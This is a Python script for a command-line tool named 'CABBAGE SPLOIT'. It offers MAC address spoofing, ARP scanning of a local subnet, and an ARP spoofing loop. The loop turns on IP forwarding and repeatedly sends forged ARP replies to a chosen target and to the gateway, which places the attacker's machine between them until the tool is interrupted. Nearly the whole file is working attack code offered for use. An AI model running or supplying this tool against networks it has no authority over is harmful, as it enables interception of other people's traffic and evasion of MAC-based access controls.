#!/usr/bin/env python
import time
import subprocess
import scapy.all as scapy
import sys
import netfilterqueue

def clear():
    subprocess.call("clear", shell=True)

def help():
    print("""
    type
    'change mac' to change mac
    'n scan' to scan for devices in your LAN 
    'arp spoof' to do arp spoofing""")


def change_mac():
    newMac = str(raw_input("set new mac address>> "))
    interface = raw_input("set the interface to change mac>> ")
    # use list for security reasons...
    subprocess.call(['ifconfig',interface,'down'])
    subprocess.call(['ifconfig',interface,'hw','ether',newMac])
    subprocess.call(['ifconfig',interface,'up'])
    print("[+] mac address of "+interface+" changed to "+newMac)


def getway():
    getwayIP = raw_input("type getway>>")
    return getwayIP


def netScan(ip):
    arp_req = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    arp_req_broadcast = broadcast/arp_req
    answered, unanswered = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)
    return answered


def netScanPrinter(ip):
    arp_req = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    arp_req_broadcast = broadcast/arp_req
    answered, unanswered = scapy.srp(arp_req_broadcast, timeout=2, verbose=False)
    print("IP\t\t\tMAC")
    print("- - - - - - - - - - - - - - - - - - - - -")
    for element in answered:
        print(element[1].psrc+"\t\t"+element[1].hwsrc)


def arpSpoof(targetIp, routerIp):
    subprocess.call("sysctl net.ipv4.ip_forward=1", shell=True)
    target = netScan(targetIp)
    targetMac = str(target[0][1].hwsrc)
    router = netScan(routerIp)
    routerMac = str(router[0][1].hwsrc)
    packetConnect = scapy.ARP(op=2, hwdst=targetMac, pdst=targetIp, psrc=routerIp)
    packetConnect2 = scapy.ARP(op=2, hwdst=routerMac, pdst=routerIp, psrc=targetIp)
    packetDisconnect = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=routerIp, hwsrc=routerMac)
    packetDisconnect2 = scapy.ARP(op=2, pdst=routerIp, hwdst=routerMac, psrc=targetIp, hwsrc=targetMac)
    try:
        sent = 0
        while True:
            scapy.send(packetConnect, verbose=False)
            scapy.send(packetConnect2, verbose=False)
            sent +=2
            print("\r[+] Packet sent: " + str(sent)),
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("detected cancelling. restoring ARP")
        scapy.send(packetDisconnect, count=4)
        scapy.send(packetDisconnect2, count=4)




print('\n                         <CABBAGE SPLOIT>\n_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ')
print('type "help" for help')
running = True
while running:
    command = str(raw_input("cabsploit> "))
    if command == "change mac":
        change_mac()

    elif command == 'n scan':
        getwayip = getway()
        ip = str(getwayip + "/24")
        netScanPrinter(ip)

    elif command == 'h' or command =='help':
        help()

    elif command == 'arp spoof':
        targetipadd = str(raw_input("target ip address>>"))
        routeripadd = getway()
        arpSpoof(targetipadd, routeripadd)
    
    elif command == 'exit':
        running = False

    elif command == "cls":
        clear()

    else:
        print("invalid command")
        help()


print("[+]exitting...\nbye\n- - - - - - - - - - - - - - - - - - - - - - - - - - -")







